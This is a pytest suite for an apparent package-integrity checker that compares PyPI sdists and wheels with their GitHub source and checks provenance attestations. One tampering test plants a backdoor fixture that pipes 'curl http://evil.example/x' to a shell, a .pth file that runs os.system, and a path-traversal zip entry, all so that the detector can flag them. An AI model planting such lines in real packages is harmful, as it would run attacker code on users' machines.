import base64
import hashlib
import json

import httpx
import pytest
import respx

from app.registries.pypi_registry import _repo_candidates, normalize_name, select_distribution
from app.services import orchestrator
from app.utils.errors import (
    DownloadError, PackageNotFoundError, RegistryError, VersionNotFoundError,
)
from tests.conftest import (
    make_tar_gz, make_wheel, make_zip, mock_github_tag, mock_pypi_provenance_missing, mock_pypi_release,
)

PKG, VER = "demo-lib", "1.2.3"
SDIST = f"demo_lib-{VER}.tar.gz"
WHEEL = f"demo_lib-{VER}-py3-none-any.whl"

SOURCE_FILES = {
    "src/demo_lib/__init__.py": b"__version__ = '1.2.3'\n",
    "src/demo_lib/core.py": b"def run():\n    return 42\n",
    "pyproject.toml": b"[project]\nname = 'demo-lib'\nversion = '1.2.3'\n[build-system]\nrequires = ['setuptools']\n",
    "README.md": b"# demo\n",
}


def _sdist(extra=None, replace=None):
    files = dict(SOURCE_FILES)
    files.update(replace or {})
    files["PKG-INFO"] = f"Metadata-Version: 2.1\nName: {PKG}\nVersion: {VER}\n".encode()
    files["demo_lib.egg-info/SOURCES.txt"] = b"src/demo_lib/core.py\n"
    files.update(extra or {})
    return make_tar_gz(files, root_dir=f"demo_lib-{VER}")


def _source_tar():
    return make_tar_gz(SOURCE_FILES, root_dir="demo-lib-" + "b" * 40)


# ------------------------------------------------------------------------------- distribution selection

def _entry(filename, packagetype, size=10, yanked=False):
    return {"filename": filename, "packagetype": packagetype, "url": "https://files.pythonhosted.org/" + filename,
            "size": size, "yanked": yanked, "digests": {"sha256": "0" * 64}}


def test_selection_prefers_sdist_over_wheels():
    chosen, reason, alternatives = select_distribution(
        [_entry("a-1-py3-none-any.whl", "bdist_wheel"), _entry("a-1.tar.gz", "sdist")], 10_000)
    assert chosen["filename"] == "a-1.tar.gz"
    assert "source distribution" in reason
    assert [a["filename"] for a in alternatives] == ["a-1-py3-none-any.whl"]


def test_selection_falls_back_to_pure_wheel_then_platform_wheel():
    chosen, reason, _ = select_distribution(
        [_entry("a-1-cp311-cp311-win_amd64.whl", "bdist_wheel"), _entry("a-1-py3-none-any.whl", "bdist_wheel")], 10_000)
    assert chosen["filename"] == "a-1-py3-none-any.whl" and "pure-Python" in reason
    chosen, reason, _ = select_distribution([_entry("a-1-cp311-cp311-win_amd64.whl", "bdist_wheel")], 10_000)
    assert "platform-specific" in reason


def test_selection_skips_yanked_and_oversized_files():
    chosen, _, _ = select_distribution(
        [_entry("a-1.tar.gz", "sdist", yanked=True), _entry("a-1-py3-none-any.whl", "bdist_wheel")], 10_000)
    assert chosen["filename"] == "a-1-py3-none-any.whl"
    chosen, _, _ = select_distribution(
        [_entry("a-1.tar.gz", "sdist", size=50_000), _entry("a-1-py3-none-any.whl", "bdist_wheel", size=100)], 10_000)
    assert chosen["filename"] == "a-1-py3-none-any.whl"


def test_selection_errors_when_nothing_usable():
    with pytest.raises(RegistryError):
        select_distribution([_entry("a-1.egg", "bdist_egg")], 10_000)
    with pytest.raises(DownloadError):
        select_distribution([_entry("a-1.tar.gz", "sdist", size=99_999)], 10_000)


def test_repo_candidates_rank_source_links_above_homepage():
    info = {"project_urls": {"Homepage": "https://github.com/acme/site", "Source Code": "https://github.com/acme/lib/tree/main",
                             "Docs": "https://docs.example.com"}, "home_page": "https://example.com"}
    repos = _repo_candidates(info)
    assert [(r.owner, r.repo, r.origin) for r in repos] == [
        ("acme", "lib", "registry_project_url"), ("acme", "site", "registry_homepage")]


def test_name_normalization():
    assert normalize_name("Demo_Lib.Extra") == "demo-lib-extra"


# ------------------------------------------------------------------------------- end to end

@respx.mock
async def test_matching_sdist_is_verified():
    mock_pypi_release(PKG, VER, [(SDIST, "sdist", _sdist())])
    mock_github_tag("acme", PKG, f"v{VER}", _source_tar())
    mock_pypi_provenance_missing(PKG, VER, SDIST)

    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")

    assert report["package"]["ecosystem"] == "pypi"
    assert report["distribution"]["kind"] == "sdist" and "source distribution" in report["distribution"]["selection_reason"]
    assert report["integrity"]["tarball_verified"] is True and report["integrity"]["verification_algorithm"] == "sha256"
    assert report["source"]["repository"] == "https://github.com/acme/demo-lib"
    assert report["source"]["correspondence"] == "INFERRED"
    assert report["summary"]["modified"] == 0 and report["summary"]["unexplained"] == 0
    assert report["summary"]["identical"] >= 4
    assert report["risk"]["verdict"] == "VERIFIED", report["findings"]
    assert report["risk"]["confidence"] in ("MEDIUM", "LOW")  # a tag match is never HIGH confidence
    assert any("No reproducible build" in lim for lim in report["limitations"])


@respx.mock
async def test_wheel_is_aligned_to_src_layout_and_metadata_is_expected_generated():
    wheel = make_wheel(PKG, VER, {
        "demo_lib/__init__.py": SOURCE_FILES["src/demo_lib/__init__.py"],
        "demo_lib/core.py": SOURCE_FILES["src/demo_lib/core.py"],
    })
    mock_pypi_release(PKG, VER, [(WHEEL, "bdist_wheel", wheel)])
    mock_github_tag("acme", PKG, f"v{VER}", _source_tar())
    mock_pypi_provenance_missing(PKG, VER, WHEEL)

    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")

    by_path = {e["path"]: e for e in report["comparison"]}
    assert by_path["demo_lib/core.py"]["status"] == "IDENTICAL"
    assert by_path[f"demo_lib-{VER}.dist-info/METADATA"]["status"] == "EXPECTED_GENERATED"
    assert any("under 'src/'" in n for n in report["source"]["notes"])
    assert report["distribution"]["kind"] == "wheel"
    assert any("wheel" in lim.lower() for lim in report["limitations"])
    assert report["risk"]["verdict"] == "VERIFIED", report["findings"]


@respx.mock
async def test_tampered_sdist_is_detected():
    sdist = _sdist(
        extra={"src/demo_lib/backdoor.py": b"import os\nos.system('curl http://evil.example/x | sh')\n",
               "evil.pth": b"import os; os.system('id')\n"},
        replace={"src/demo_lib/core.py": b"def run():\n    return 43  # changed\n"},
    )
    mock_pypi_release(PKG, VER, [(SDIST, "sdist", sdist)])
    mock_github_tag("acme", PKG, f"v{VER}", _source_tar())
    mock_pypi_provenance_missing(PKG, VER, SDIST)

    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")

    rules = {(f["rule_id"], f.get("file")) for f in report["findings"]}
    assert ("UNEXPLAINED_SOURCE_DIFF", "src/demo_lib/core.py") in rules
    assert ("ADDED_FILE_NOT_IN_SOURCE", "src/demo_lib/backdoor.py") in rules
    assert ("PTH_FILE_EXECUTES_CODE", "evil.pth") in rules
    assert any(r == "SUSPICIOUS_CONTENT_IN_CHANGED_FILE" for r, _ in rules)
    assert report["risk"]["verdict"] == "HIGH_RISK"


@respx.mock
async def test_wheel_record_mismatch_is_high_risk():
    wheel = make_wheel(PKG, VER, {"demo_lib/__init__.py": b"x = 1\n"},
                       tamper={"demo_lib/__init__.py": b"x = 1\nimport socket\n"},
                       extra_unlisted={"demo_lib/dropper.py": b"print('hi')\n"})
    mock_pypi_release(PKG, VER, [(WHEEL, "bdist_wheel", wheel)], project_urls={})
    mock_pypi_provenance_missing(PKG, VER, WHEEL)

    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")

    rules = {f["rule_id"] for f in report["findings"]}
    assert {"WHEEL_RECORD_HASH_MISMATCH", "WHEEL_FILE_NOT_IN_RECORD"} <= rules
    assert report["risk"]["verdict"] == "HIGH_RISK"


@respx.mock
async def test_checksum_mismatch_fails_integrity():
    mock_pypi_release(PKG, VER, [(SDIST, "sdist", _sdist())], sha_override={SDIST: "f" * 64})
    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")
    assert report["integrity"]["tarball_verified"] is False
    assert report["analysis_complete"] is False
    assert report["risk"]["verdict"] == "HIGH_RISK"
    assert "sha256" in report["limitations"][0]


@respx.mock
async def test_missing_source_repository_is_a_warning_with_low_confidence():
    mock_pypi_release(PKG, VER, [(SDIST, "sdist", _sdist())], project_urls={"Documentation": "https://docs.example.com"})
    mock_pypi_provenance_missing(PKG, VER, SDIST)
    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")
    assert report["source"]["correspondence"] == "NONE"
    assert report["risk"]["level"] == "INCONCLUSIVE"
    assert report["risk"]["verdict"] == "WARNING"
    assert report["risk"]["confidence"] == "LOW"


@respx.mock
async def test_user_supplied_repository_takes_priority_and_is_flagged():
    mock_pypi_release(PKG, VER, [(SDIST, "sdist", _sdist())], project_urls={})
    mock_github_tag("fork", "demo-lib-fork", f"v{VER}", _source_tar())
    mock_pypi_provenance_missing(PKG, VER, SDIST)
    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi", repository_url="https://github.com/fork/demo-lib-fork")
    assert report["source"]["repository"] == "https://github.com/fork/demo-lib-fork"
    assert any("supplied by the user" in n for n in report["source"]["notes"])


@respx.mock
async def test_declared_version_mismatch_lowers_source_confidence():
    source = make_tar_gz({**SOURCE_FILES, "pyproject.toml": b"[project]\nname='demo-lib'\nversion = '0.9.0'\n"}, root_dir="r-" + "b" * 40)
    mock_pypi_release(PKG, VER, [(SDIST, "sdist", _sdist())])
    mock_github_tag("acme", PKG, f"v{VER}", source)
    mock_pypi_provenance_missing(PKG, VER, SDIST)
    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")
    assert report["source"]["confidence"] == "LOW"
    assert any("0.9.0" in n for n in report["source"]["notes"])


@respx.mock
async def test_unsafe_published_zip_yields_high_risk_report_not_a_crash():
    evil = make_zip({"../../evil.py": b"x"})
    mock_pypi_release(PKG, VER, [(WHEEL, "bdist_wheel", evil)])
    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")
    assert report["analysis_complete"] is False
    assert report["findings"][0]["rule_id"] == "UNSAFE_ARCHIVE"
    assert report["risk"]["verdict"] == "HIGH_RISK"


@respx.mock
async def test_package_and_version_not_found():
    respx.get("https://pypi.org/pypi/nope/1.0/json").mock(return_value=httpx.Response(404))
    respx.get("https://pypi.org/pypi/nope/json").mock(return_value=httpx.Response(404))
    with pytest.raises(PackageNotFoundError):
        await orchestrator.analyze_package("nope", "1.0", ecosystem="pypi")

    respx.get("https://pypi.org/pypi/real/9.9/json").mock(return_value=httpx.Response(404))
    respx.get("https://pypi.org/pypi/real/json").mock(return_value=httpx.Response(200, json={"info": {}}))
    with pytest.raises(VersionNotFoundError):
        await orchestrator.analyze_package("real", "9.9", ecosystem="pypi")


@respx.mock
async def test_metadata_for_a_different_project_is_rejected():
    respx.get("https://pypi.org/pypi/demo-lib/1.2.3/json").mock(return_value=httpx.Response(200, json={
        "info": {"name": "someone-else", "version": "1.2.3"}, "urls": []}))
    with pytest.raises(RegistryError):
        await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")


# ------------------------------------------------------------------------------- PyPI provenance

def _attestation(filename, digest, repository):
    statement = {"_type": "https://in-toto.io/Statement/v1", "subject": [{"name": filename, "digest": {"sha256": digest}}],
                 "predicateType": "https://docs.pypi.org/attestations/publish/v1"}
    return {"attestation_bundles": [{
        "publisher": {"kind": "GitHub", "repository": repository, "workflow": "release.yml"},
        "attestations": [{"envelope": {"statement": base64.b64encode(json.dumps(statement).encode()).decode(), "signature": "x"}}],
    }]}


@respx.mock
async def test_consistent_attestation_is_not_verified_never_verified():
    blob = _sdist()
    mock_pypi_release(PKG, VER, [(SDIST, "sdist", blob)])
    mock_github_tag("acme", PKG, f"v{VER}", _source_tar())
    respx.get(f"https://pypi.org/integrity/{PKG}/{VER}/{SDIST}/provenance").mock(
        return_value=httpx.Response(200, json=_attestation(SDIST, hashlib.sha256(blob).hexdigest(), "acme/demo-lib")))
    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")
    assert report["integrity"]["provenance_status"] == "NOT_VERIFIED"
    assert any("signature chain" in lim for lim in report["limitations"])


@respx.mock
async def test_attestation_for_another_repository_is_invalid_and_high_risk():
    blob = _sdist()
    mock_pypi_release(PKG, VER, [(SDIST, "sdist", blob)])
    mock_github_tag("acme", PKG, f"v{VER}", _source_tar())
    respx.get(f"https://pypi.org/integrity/{PKG}/{VER}/{SDIST}/provenance").mock(
        return_value=httpx.Response(200, json=_attestation(SDIST, "0" * 64, "mallory/demo-lib")))
    report = await orchestrator.analyze_package(PKG, VER, ecosystem="pypi")
    assert report["integrity"]["provenance_status"] == "INVALID"
    assert any(f["rule_id"] == "PROVENANCE_CLAIM_MISMATCH" for f in report["findings"])
    assert report["risk"]["verdict"] == "HIGH_RISK"
